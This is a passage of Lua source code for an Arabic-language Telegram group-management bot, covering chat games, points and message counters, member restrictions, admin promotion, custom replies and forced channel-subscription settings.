name = string.gsub(name,"ضعيف","قوي")
name = string.gsub(name,"شريف","كواد")
name = string.gsub(name,"شجاع","جبان")
name = string.gsub(name,"رحت","اجيت")
name = string.gsub(name,"عدل","ميت")
name = string.gsub(name,"نشيط","كسول")
name = string.gsub(name,"شبعان","جوعان")
name = string.gsub(name,"موعطشان","عطشان")
name = string.gsub(name,"خوش ولد","موخوش ولد")
name = string.gsub(name,"اني","مطي")
name = string.gsub(name,"هادئ","عصبي")
send(msg.chat_id_, msg.id_,"• اسرع واحد يرسل العكس "..name.."")
return false
end
end
if text == "خمن" or text == "تخمين" then   
if redis:get(bot_id.."Tshakex:Lock:Game:Group"..msg.chat_id_) then
Num = math.random(1,20)
redis:set(bot_id.."Tshakex:GAMES:NUM"..msg.chat_id_,Num) 
send(msg.chat_id_, msg.id_,"\n• اهلا بك عزيزي في لعبة التخمين :\nٴ━━━━━━━━━━\n".."• ملاحظه لديك { 3 } محاولات فقط فكر قبل ارسال تخمينك \n\n".."• سيتم تخمين عدد ما بين ال {1 و 20} اذا تعتقد انك تستطيع الفوز جرب واللعب الان ؟ ")
redis:setex(bot_id.."Tshakex:GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 100, true)  
return false  
end
end
if text == "محيبس" or text == "بات" then
if redis:get(bot_id.."Tshakex:Lock:Game:Group"..msg.chat_id_) then   
Num = math.random(1,6)
redis:set(bot_id.."Tshakex:Games:Bat"..msg.chat_id_,Num) 
send(msg.chat_id_, msg.id_,[[
*➀       ➁     ➂      ➃      ➄     ➅
↓      ↓     ↓      ↓     ↓     ↓
👊 ‹› 👊 ‹› 👊 ‹› 👊 ‹› 👊 ‹› 👊
• اختر لأستخراج المحيبس الايد التي تحمل المحيبس 
• الفائز يحصل على { 3 } من النقاط *
]])
redis:setex(bot_id.."Tshakex:SET:GAME" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 100, true)  
return false  
end
end
if text == "المختلف" then
if redis:get(bot_id.."Tshakex:Lock:Game:Group"..msg.chat_id_) then
mktlf = {"😸","☠","🐼","🐇","🌑","🌚","⭐️","✨","⛈","🌥","⛄️","👨‍🔬","👨‍💻","👨‍🔧","🧚‍♀","🧜‍♂","🧝‍♂","🙍‍♂","🧖‍♂","👬","🕒","🕤","⌛️","📅",};
name = mktlf[math.random(#mktlf)]
redis:del(bot_id.."Tshakex:Set:Moktlf:Bot"..msg.chat_id_)
redis:set(bot_id.."Tshakex::Set:Moktlf"..msg.chat_id_,name)
name = string.gsub(name,"😸","😹😹😹??😹????😹😸😹😹😹😹")
name = string.gsub(name,"☠","💀💀💀💀💀💀💀☠💀💀💀💀💀")
name = string.gsub(name,"🐼","👻👻👻🐼👻👻👻👻??👻👻")
name = string.gsub(name,"🐇","🕊🕊🕊🕊🕊🐇🕊🕊🕊🕊")
name = string.gsub(name,"🌑","🌚🌚🌚🌚🌚🌑🌚🌚🌚")
name = string.gsub(name,"🌚","🌑🌑🌑🌑🌑🌚🌑🌑🌑")
name = string.gsub(name,"⭐️","⭐️")
name = string.gsub(name,"✨","💫💫💫💫💫✨💫💫💫💫")
name = string.gsub(name,"⛈","🌨🌨🌨🌨🌨⛈🌨🌨🌨🌨")
name = string.gsub(name,"🌥","⛅️⛅️⛅️⛅️⛅️⛅️🌥⛅️⛅️⛅️⛅️")
name = string.gsub(name,"⛄️","☃☃☃☃☃☃⛄️☃☃☃☃")
name = string.gsub(name,"👨‍🔬","👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👨‍🔬👩‍🔬👩‍🔬👩‍🔬")
name = string.gsub(name,"👨‍💻","👩‍💻👩‍💻👩‍‍💻👩‍‍💻👩‍💻👨‍💻👩‍💻👩‍💻👩‍💻")
name = string.gsub(name,"👨‍🔧","👩‍🔧👩‍🔧👩‍🔧👩‍🔧👩‍🔧👩‍🔧👨‍🔧👩‍??")
name = string.gsub(name,"👩‍🍳","👨‍🍳👨‍🍳👨‍🍳👨‍🍳👨‍🍳👩‍🍳👨‍🍳👨‍🍳👨‍🍳")
name = string.gsub(name,"🧚‍♀","🧚‍♂🧚‍♂🧚‍♂🧚‍♂🧚‍♀🧚‍♂🧚‍♂")
name = string.gsub(name,"🧜‍♂","🧜‍♀🧜‍♀🧜‍♀🧜‍♀🧜‍♀🧚‍♂🧜‍♀🧜‍♀🧜‍♀")
name = string.gsub(name,"🧝‍♂","🧝‍♀🧝‍♀🧝‍♀🧝‍♀🧝‍♀🧝‍♂🧝‍♀🧝‍♀🧝‍♀")
name = string.gsub(name,"🙍‍♂️","🙎‍♂️🙎‍♂️🙎‍♂️🙎‍♂️🙎‍♂️🙍‍♂️🙎‍♂️🙎‍♂️🙎‍♂️")
name = string.gsub(name,"🧖‍♂️","🧖‍♀️🧖‍♀️🧖‍♀️🧖‍♀️🧖‍♀️🧖‍♂️🧖‍♀️🧖‍♀️🧖‍♀️🧖‍♀️")
name = string.gsub(name,"👬","👭👭👭👭👭👬👭👭👭")
name = string.gsub(name,"👨‍👨‍👧","??‍👨‍👦👨‍👨‍👦👨‍👨‍👦👨‍👨‍👦👨‍👨‍👧👨‍👨‍👦👨‍👨‍👦")
name = string.gsub(name,"🕒","🕒🕒🕒🕒🕒🕒🕓🕒🕒🕒")
name = string.gsub(name,"🕤","🕥🕥🕥🕥🕥🕤🕥🕥🕥")
name = string.gsub(name,"⌛️","⏳⏳⏳⏳⏳⏳⌛️⏳⏳")
name = string.gsub(name,"📅","📆📆📆📆📆📆📅📆📆")
send(msg.chat_id_, msg.id_,"• اسرع واحد يرسل الاختلاف "..name.."")
return false
end
end
if text == "امثله" then
if redis:get(bot_id.."Tshakex:Lock:Game:Group"..msg.chat_id_) then
mthal = {"جوز","ضراطه","الحبل","الحافي","شقره","بيدك","سلايه","النخله","الخيل","حداد","المبلل","يركص","قرد","العنب","العمه","الخبز","بالحصاد","شهر","شكه","يكحله",};
name = mthal[math.random(#mthal)]
redis:set(bot_id.."Tshakex:Set:Amth"..msg.chat_id_,name)
redis:del(bot_id.."Tshakex:Set:Amth:Bot"..msg.chat_id_)
name = string.gsub(name,"جوز","ينطي____للماعده سنون")
name = string.gsub(name,"ضراطه","الي يسوق المطي يتحمل___")
name = string.gsub(name,"بيدك","اكل___محد يفيدك")
name = string.gsub(name,"الحافي","تجدي من___نعال")
name = string.gsub(name,"شقره","مع الخيل يا___")
name = string.gsub(name,"النخله","الطول طول___والعقل عقل الصخلة")
name = string.gsub(name,"سلايه","بالوجه امراية وبالظهر___")
name = string.gsub(name,"الخيل","من قلة___شدو على الچلاب سروج")
name = string.gsub(name,"حداد","موكل من صخم وجهه كال آني___")
name = string.gsub(name,"المبلل","___ما يخاف من المطر")
name = string.gsub(name,"الحبل","اللي تلدغة الحية يخاف من جرة___")
name = string.gsub(name,"يركص","المايعرف___يكول الكاع عوجه")
name = string.gsub(name,"العنب","المايلوح___يكول حامض")
name = string.gsub(name,"العمه","___إذا حبت الچنة ابليس يدخل الجنة")
name = string.gsub(name,"الخبز","انطي___للخباز حتى لو ياكل نصه")
name = string.gsub(name,"باحصاد","اسمة___ومنجله مكسور")
name = string.gsub(name,"شهر","امشي__ولا تعبر نهر")
name = string.gsub(name,"شكه","يامن تعب يامن__يا من على الحاضر لكة")
name = string.gsub(name,"القرد","__بعين امه غزال")
name = string.gsub(name,"يكحله","اجه___عماها")
send(msg.chat_id_, msg.id_,"• اسرع واحد يكمل المثل "..name.."")
return false
end
end
if text == 'رسائلي' then
local nummsg = redis:get(bot_id..'Tshakex:Num:Message:User'..msg.chat_id_..':'..msg.sender_user_id_) or 1
send(msg.chat_id_, msg.id_,'• عدد رسائلك هنا *~ '..nummsg..'*') 
end
if text == 'سحكاتي' or text == 'تعديلاتي' then
local edit = redis:get(bot_id..'Tshakex:Num:Message:Edit'..msg.chat_id_..msg.sender_user_id_) or 0
send(msg.chat_id_, msg.id_,'• عدد التعديلات هنا *~ '..edit..'*') 
end
if text == 'جهاتي' then
local addmem = redis:get(bot_id.."Tshakex:Num:Add:Memp"..msg.chat_id_..":"..msg.sender_user_id_) or 0
send(msg.chat_id_, msg.id_,'• عدد جهاتك المضافه هنا *~ '..addmem..'*') 
end
if text == "نقاطي" then 
local Num = redis:get(bot_id.."Tshakex:Num:Add:Games"..msg.chat_id_..msg.sender_user_id_) or 0
if Num == 0 then 
Text = "• لم تفز بأي مجوهره "
else
Text = "• عدد نقاط التي ربحتها *← "..Num.." *"
end
send(msg.chat_id_, msg.id_,Text) 
end
if text and text:match("^بيع نقاطي (%d+)$") then
local NUMPY = text:match("^بيع نقاطي (%d+)$") 
if tonumber(NUMPY) == tonumber(0) then
send(msg.chat_id_,msg.id_,"\n*• لا استطيع البيع اقل من 1 *") 
return false 
end
if tonumber(redis:get(bot_id.."Tshakex:Num:Add:Games"..msg.chat_id_..msg.sender_user_id_)) == tonumber(0) then
send(msg.chat_id_,msg.id_,"• ليس لديك جواهر من الالعاب \n• اذا كنت تريد ربح نقاط \n• ارسل الالعاب وابدأ اللعب ! ") 
else
local NUM_GAMES = redis:get(bot_id.."Tshakex:Num:Add:Games"..msg.chat_id_..msg.sender_user_id_)
if tonumber(NUMPY) > tonumber(NUM_GAMES) then
send(msg.chat_id_,msg.id_,"\n• ليس لديك جواهر بهاذا العدد \n• لزيادة نقاطك في اللعبه \n• ارسل الالعاب وابدأ اللعب !") 
return false 
end
local NUMNKO = (NUMPY * 50)
redis:decrby(bot_id.."Tshakex:Num:Add:Games"..msg.chat_id_..msg.sender_user_id_,NUMPY)  
redis:incrby(bot_id.."Tshakex:Num:Message:User"..msg.chat_id_..":"..msg.sender_user_id_,NUMNKO)  
send(msg.chat_id_,msg.id_,"• تم خصم *~ { "..NUMPY.." }* من نقاطك \n• وتم اضافة* ~ { "..(NUMPY * 50).." } رساله الى رسالك *")
end 
return false 
end
if text and text:match("^اضف رسائل (%d+)$") and msg.reply_to_message_id_ == 0 and Constructor(msg) then    
yazon = text:match("^اضف رسائل (%d+)$")
redis:set(bot_id.."Tshakex:id:user"..msg.chat_id_,yazon)  
redis:setex(bot_id.."Tshakex:Add:msg:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 120, true)  
send(msg.chat_id_, msg.id_, "• ارسل لي عدد الرسائل الان") 
return false
end
if text and text:match("^اضف نقاط (%d+)$") and msg.reply_to_message_id_ == 0 and Constructor(msg) then  
yazon = text:match("^اضف نقاط (%d+)$")
redis:set(bot_id.."Tshakex:idgem:user"..msg.chat_id_,yazon)  
redis:setex(bot_id.."Tshakex:gemadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 120, true)  
send(msg.chat_id_, msg.id_, "• ارسل لي عدد النقاط الان") 
end
if text and text:match("^اضف نقاط (%d+)$") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
function reply(extra, result, success)
redis:incrby(bot_id.."Tshakex:Num:Add:Games"..msg.chat_id_..result.sender_user_id_,text:match("^اضف نقاط (%d+)$"))  
send(msg.chat_id_, msg.id_,"• تم اضافه عدد نقاط : "..text:match("^اضف نقاط (%d+)$").." ")  
end
tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},reply, nil)
return false
end
if text and text:match("^اضف رسائل (%d+)$") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
function reply(extra, result, success)
redis:del(bot_id.."Tshakex:Msg_User"..msg.chat_id_..":"..result.sender_user_id_) 
redis:incrby(bot_id.."Tshakex:Num:Message:User"..msg.chat_id_..":"..result.sender_user_id_,text:match("^اضف رسائل (%d+)$"))  
send(msg.chat_id_, msg.id_, "• تم اضافه عدد الرسائل : "..text:match("^اضف رسائل (%d+)$").." ")  
end
tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},reply, nil)
return false
end
if text == "مسح المشتركين" and Dev_Bots(msg) then
local pv = redis:smembers(bot_id..'Tshakex:Num:User:Pv')  
local sendok = 0
for i = 1, #pv do
tdcli_function({ID='GetChat',chat_id_ = pv[i]},function(arg,dataq)
tdcli_function ({ ID = "SendChatAction",chat_id_ = pv[i], action_ = {  ID = "SendMessageTypingAction", progress_ = 100} },function(arg,data) 
if data.ID and data.ID == "Ok"  then
else
redis:srem(bot_id..'Tshakex:Num:User:Pv',pv[i])  
sendok = sendok + 1
end
if #pv == i then 
if sendok == 0 then
send(msg.chat_id_, msg.id_,'• لا يوجد مشتركين وهميين')   
else
local ok = #pv - sendok
send(msg.chat_id_, msg.id_,'*• عدد المشتركين الان ←{ '..#pv..' }\n• تم العثور على ←{ '..sendok..' } مشترك قام بحظر البوت\n• اصبح عدد المشتركين الان ←{ '..ok..' } مشترك *')   
end
end
end,nil)
end,nil)
end
return false
end
if text == "مسح المجموعات" and Dev_Bots(msg) then
local group = redis:smembers(bot_id..'Tshakex:ChekBotAdd')  
local w = 0
local q = 0
for i = 1, #group do
tdcli_function({ID='GetChat',chat_id_ = group[i]
},function(arg,data)
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
redis:srem(bot_id..'Tshakex:ChekBotAdd',group[i])  
w = w + 1
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
redis:srem(bot_id..'Tshakex:ChekBotAdd',group[i])  
q = q + 1
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusKicked" then
redis:srem(bot_id..'Tshakex:ChekBotAdd',group[i])  
q = q + 1
end
if data and data.code_ and data.code_ == 400 then
redis:srem(bot_id..'Tshakex:ChekBotAdd',group[i])  
w = w + 1
end
if #group == i then 
if (w + q) == 0 then
send(msg.chat_id_, msg.id_,'• لا توجد مجموعات وهميه ')   
else
local yazon = (w + q)
local sendok = #group - yazon
if q == 0 then
yazon = ''
else
yazon = '\n•  تم ازالة ~ '..q..' مجموعات من البوت'
end
if w == 0 then
groupss = ''
else
groupss = '\n•  تم ازالة ~'..w..' مجموعه لان البوت عضو'
end
send(msg.chat_id_, msg.id_,'*•  عدد المجموعات الان ← { '..#group..' } مجموعه '..groupss..''..yazon..'\n• اصبح عدد المجموعات الان ← { '..sendok..' } مجموعات*\n')   
end
end
end,nil)
end
end
if text == "اطردني" or text == "طردني" then
if not redis:get(bot_id.."Tshakex:Cheking:Kick:Me:Group"..msg.chat_id_) then
if Rank_Checking(msg.sender_user_id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, "\n•  عذرا لا استطيع طرد "..Get_Rank(msg.sender_user_id_,msg.chat_id_).." ")
return false
end
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=msg.sender_user_id_,status_={ID="ChatMemberStatusKicked"},},function(arg,data) 
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,"•  ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
return false  
end
if (data and data.code_ and data.code_ == 3) then 
send(msg.chat_id_, msg.id_,"•  البوت ليس ادمن يرجى ترقيتي !") 
return false  
end
if data and data.code_ and data.code_ == 400 and data.message_ == "USER_ADMIN_INVALID" then 
send(msg.chat_id_, msg.id_,"•  عذرا لا استطيع طرد ادمنية المجموعه") 
return false  
end
if data and data.ID and data.ID == "Ok" then
send(msg.chat_id_, msg.id_,"•  تم طردك من المجموعه ") 
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = msg.sender_user_id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
return false
end
end,nil)   
else
send(msg.chat_id_, msg.id_,"•  امر اطردني تم تعطيله من قبل المدراء ") 
end
end
if text and text:match("^رفع القيود @(.*)") and Owner(msg) then 
local username = text:match("^رفع القيود @(.*)") 
function Function_Status(extra, result, success)
if result.id_ then
if Dev_Bots(msg) then
redis:srem(bot_id.."Tshakex:Removal:User:Groups",result.id_)
redis:srem(bot_id.."Tshakex:Removal:User:Group"..msg.chat_id_,result.id_)
redis:srem(bot_id.."Tshakex:Silence:User:Group"..msg.chat_id_,result.id_)
redis:srem(bot_id.."Tshakex:Silence:User:Groups"..msg.chat_id_,result.id_)
Send_Options(msg,result.id_,"reply","\n•  تم الغاء القيود عنه")  
else
redis:srem(bot_id.."Tshakex:Removal:User:Group"..msg.chat_id_,result.id_)
redis:srem(bot_id.."Tshakex:Silence:User:Group"..msg.chat_id_,result.id_)
Send_Options(msg,result.id_,"reply","\n•  تم الغاء القيود عنه")  
end
else
send(msg.chat_id_, msg.id_,"•  المعرف غلط")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Status, nil)
end
if text == "رفع القيود" and Owner(msg) then
function Function_Status(extra, result, success)
if Dev_Bots(msg) then
redis:srem(bot_id.."Tshakex:Removal:User:Groups",result.sender_user_id_)
redis:srem(bot_id.."Tshakex:Removal:User:Group"..msg.chat_id_,result.sender_user_id_)
redis:srem(bot_id.."Tshakex:Silence:User:Group"..msg.chat_id_,result.sender_user_id_)
redis:srem(bot_id.."Tshakex:Silence:User:Groups"..msg.chat_id_,result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","\n•  تم الغاء القيود عنه")  
else
redis:srem(bot_id.."Tshakex:Removal:User:Group"..msg.chat_id_,result.sender_user_id_)
redis:srem(bot_id.."Tshakex:Silence:User:Group"..msg.chat_id_,result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","\n•  تم الغاء القيود عنه")  
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Status, nil)
end
if text and text:match("^كشف القيود @(.*)") and Owner(msg) then 
local username = text:match("^كشف القيود @(.*)") 
function Function_Status(extra, result, success)
if result.id_ then
if redis:sismember(bot_id.."Tshakex:Silence:User:Group"..msg.chat_id_,result.id_) then
Muted = "مكتوم"
else
Muted = "غير مكتوم"
end
if redis:sismember(bot_id.."Tshakex:Removal:User:Group"..msg.chat_id_,result.id_) then
Ban = "محظور"
else
Ban = "غير محظور"
end
if redis:sismember(bot_id.."Tshakex:Removal:User:Groups",result.id_) then
GBan = "محظور عام"
else
GBan = "غير محظور عام"
end
if redis:sismember(bot_id.."Tshakex:Silence:User:Groups",result.id_) then
GBanss = "مكتوم عام"
else
GBanss = "غير مكتوم عام"
end
send(msg.chat_id_, msg.id_,"•  كتم العام ← "..GBanss.."\n•  الحظر العام ← "..GBan.."\n•  الحظر ← "..Ban.."\n•  الكتم ← "..Muted)
else
send(msg.chat_id_, msg.id_,"•  المعرف غلط")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Status, nil)
end
if text == "كشف القيود" and Owner(msg) then 
function Function_Status(extra, result, success)
if redis:sismember(bot_id.."Tshakex:Silence:User:Group"..msg.chat_id_,result.sender_user_id_) then
Muted = "مكتوم"
else
Muted = "غير مكتوم"
end
if redis:sismember(bot_id.."Tshakex:Removal:User:Group"..msg.chat_id_,result.sender_user_id_) then
Ban = "محظور"
else
Ban = "غير محظور"
end
if redis:sismember(bot_id.."Tshakex:Removal:User:Groups",result.sender_user_id_) then
GBan = "محظور عام"
else
GBan = "غير محظور عام"
end
if redis:sismember(bot_id.."Tshakex:Silence:User:Groups",result.sender_user_id_) then
GBanss = "مكتوم عام"
else
GBanss = "غير مكتوم عام"
end
send(msg.chat_id_, msg.id_,"•  كتم العام ← "..GBanss.."\n•  الحظر العام ← "..GBan.."\n•  الحظر ← "..Ban.."\n•  الكتم ← "..Muted)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Status, nil)
end
if text ==("رفع الادمنيه") and Owner(msg) then
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local num2 = 0
local admins = data.members_
for i=0 , #admins do
if data.members_[i].bot_info_ == false and data.members_[i].status_.ID == "ChatMemberStatusEditor" then
redis:sadd(bot_id..'Tshakex:Admin:Group'..msg.chat_id_, admins[i].user_id_)
num2 = num2 + 1
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,b) 
if b.username_ == true then
end
if b.first_name_ == false then
redis:srem(bot_id..'Tshakex:Admin:Group'..msg.chat_id_, admins[i].user_id_)
end
end,nil)   
else
redis:sadd(bot_id..'Tshakex:Admin:Group'..msg.chat_id_, admins[i].user_id_)
end
end
if num2 == 0 then
send(msg.chat_id_, msg.id_,"•  لا توجد ادمنية ليتم رفعهم") 
else
send(msg.chat_id_, msg.id_,"•  تمت ترقية - "..num2.." من ادمنية المجموعه") 
end
end,nil)   
end
if text and text:match("^(.*)$") then
if redis:get(bot_id.."botss:Tshakex:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_, '\nارسل لي الكلمه الان ')
redis:set(bot_id.."botss:Tshakex:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_, "true1")
redis:set(bot_id.."botss:Tshakex:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_, text)
redis:sadd(bot_id.."botss:Tshakex:List:Rd:Sudo", text)
return false end
end
if text and text:match("^(.*)$") then
if redis:get(bot_id.."botss:Tshakex:Set:On"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_,"تم حذف الرد من ردود المتعدده")
redis:del(bot_id..'botss:Tshakex:Add:Rd:Sudo:Text'..text)
redis:del(bot_id..'botss:Tshakex:Add:Rd:Sudo:Text1'..text)
redis:del(bot_id..'botss:Tshakex:Add:Rd:Sudo:Text2'..text)
redis:del(bot_id.."botss:Tshakex:Set:On"..msg.sender_user_id_..":"..msg.chat_id_)
redis:srem(bot_id.."botss:Tshakex:List:Rd:Sudo", text)
return false
end
end
if text == ("مسح الردود المتعدده") and Dev_Bots(msg) then 
local list = redis:smembers(bot_id.."botss:Tshakex:List:Rd:Sudo")
for k,v in pairs(list) do  
redis:del(bot_id.."botss:Tshakex:Add:Rd:Sudo:Text"..v) 
redis:del(bot_id.."botss:Tshakex:Add:Rd:Sudo:Text1"..v) 
redis:del(bot_id.."botss:Tshakex:Add:Rd:Sudo:Text2"..v)   
redis:del(bot_id.."botss:Tshakex:List:Rd:Sudo")
end
send(msg.chat_id_, msg.id_,"تم حذف ردود المتعدده")
end
if text == ("الردود المتعدده") and Dev_Bots(msg) then 
local list = redis:smembers(bot_id.."botss:Tshakex:List:Rd:Sudo")
text = "\nقائمة ردود المتعدده \n━━━━━━━━\n"
for k,v in pairs(list) do
db = "رساله "
text = text..""..k.." => {"..v.."} => {"..db.."}\n"
end
if #list == 0 then
text = "لا توجد ردود متعدده"
end
send(msg.chat_id_, msg.id_,"["..text.."]")
end
if text == "اضف رد متعدد" and DeveloperBot1(msg) then 
redis:set(bot_id.."botss:Tshakex:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,true)
return send(msg.chat_id_, msg.id_,"ارسل الرد الذي اريد اضافته")
end
if text == "حذف رد متعدد" and DeveloperBot1(msg) then 
redis:set(bot_id.."botss:Tshakex:Set:On"..msg.sender_user_id_..":"..msg.chat_id_,true)
return send(msg.chat_id_, msg.id_,"ارسل الان الكلمه لحذفها ")
end
if text then  
local test = redis:get(bot_id.."botss:Tshakex:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if redis:get(bot_id.."botss:Tshakex:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true1" then
redis:set(bot_id.."botss:Tshakex:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd1')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
redis:set(bot_id.."botss:Tshakex:Add:Rd:Sudo:Text"..test, text)  
end  
send(msg.chat_id_, msg.id_,"تم حفظ الرد الاول ارسل الرد الثاني")
return false  
end  
end
if text then  
local test = redis:get(bot_id.."botss:Tshakex:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if redis:get(bot_id.."botss:Tshakex:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "rd1" then
redis:set(bot_id.."botss:Tshakex:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd2')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
redis:set(bot_id.."botss:Tshakex:Add:Rd:Sudo:Text1"..test, text)  
end  
send(msg.chat_id_, msg.id_,"تم حفظ الرد الثاني ارسل الرد الثالث")
return false  
end  
end
if text then  
local test = redis:get(bot_id.."botss:Tshakex:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if redis:get(bot_id.."botss:Tshakex:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "rd2" then
redis:set(bot_id.."botss:Tshakex:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd3')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
redis:set(bot_id.."botss:Tshakex:Add:Rd:Sudo:Text2"..test, text)  
end  
send(msg.chat_id_, msg.id_,"تم حفظ الرد")
return false  
end  
end
if text then
local Text = redis:get(bot_id.."botss:Tshakex:Add:Rd:Sudo:Text"..text)   
local Text1 = redis:get(bot_id.."botss:Tshakex:Add:Rd:Sudo:Text1"..text)   
local Text2 = redis:get(bot_id.."botss:Tshakex:Add:Rd:Sudo:Text2"..text)   
if Text or Text1 or Text2 then 
local texting = {
Text,
Text1,
Text2
}
Textes = math.random(#texting)
send(msg.chat_id_, msg.id_,texting[Textes])
end
end
if text ==("المالك") then
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
owner_id = admins[i].user_id_
tdcli_function ({ID = "GetUser",user_id_ = owner_id},function(arg,b) 
if b.first_name_ == false then
send(msg.chat_id_, msg.id_,"•  حساب المالك محذوف")
return false  
end
local UserName = (b.username_ or "ramses20")
send(msg.chat_id_, msg.id_,"• مالك المجموعه ~ ["..b.first_name_.."](T.me/"..UserName..")")  
end,nil)   
end
end
end,nil)   
end
if text ==("رفع المالك") and DeveloperBot(msg) then 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
owner_id = admins[i].user_id_
end
end
tdcli_function ({ID = "GetUser",user_id_ = owner_id},function(arg,b) 
if b.first_name_ == false then
send(msg.chat_id_, msg.id_,"• حساب المالك محذوف")
return false  
end
local UserName = (b.username_ or "ramses20")
send(msg.chat_id_, msg.id_,"• تم ترقية مالك المجموعه ← ["..b.first_name_.."](T.me/"..UserName..")")  
redis:sadd(bot_id.."Tshakex:President:Group"..msg.chat_id_,b.id_)
end,nil)   
end,nil)   
end
if text and text:match("^تعين عدد الاعضاء (%d+)$") and Dev_Bots(msg) then
redis:set(bot_id..'Tshakex:Num:Add:Bot',text:match("تعين عدد الاعضاء (%d+)$") ) 
send(msg.chat_id_, msg.id_,'*•  تم تعين عدد اعضاء تفعيل البوت اكثر من : '..text:match("تعين عدد الاعضاء (%d+)$")..' عضو *')
end

if text and text:match("^تغير الاشتراك$") then
if not Dev_Bots(msg) then
send(msg.chat_id_,msg.id_,' هذا الامر خاص المطور الاساسي فقط')
return false
end
redis:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, '• حسنا ارسل لي معرف القناة') 
return false  
end
if text and text:match("^تغير رساله الاشتراك$") then
if not Dev_Bots(msg) then
send(msg.chat_id_,msg.id_,' هذا الامر خاص المطور الاساسي فقط')
return false
end
redis:setex(bot_id.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, '• حسنا ارسل لي النص الذي تريده') 
return false  
end
if text == "حذف رساله الاشتراك" then
if not Dev_Bots(msg) then
send(msg.chat_id_,msg.id_,' هذا الامر خاص المطور الاساسي فقط')
return false
end
redis:del(bot_id..'text:ch:user')
send(msg.chat_id_, msg.id_, "• تم مسح رساله الاشتراك ") 
return false  
end
if text and text:match("^وضع قناة الاشتراك$") then
if not Dev_Bots(msg) then
send(msg.chat_id_,msg.id_,' هذا الامر خاص المطور الاساسي فقط')
return false
end
redis:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, '• حسنا ارسل لي معرف القناة') 
return false  
end
if text == "تفعيل الاشتراك" then
if not Dev_Bots(msg) then
send(msg.chat_id_,msg.id_,' هذا الامر خاص المطور الاساسي فقط')
return false
end
if redis:get(bot_id..'add:ch:id') then
local addchusername = redis:get(bot_id..'add:ch:username')
send(msg.chat_id_, msg.id_,"• الاشتراك الاجباري مفعل \n على القناة ⇠ ["..addchusername.."]")
else
redis:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_," لا يوجد قناة للاشتراك الاجباري")
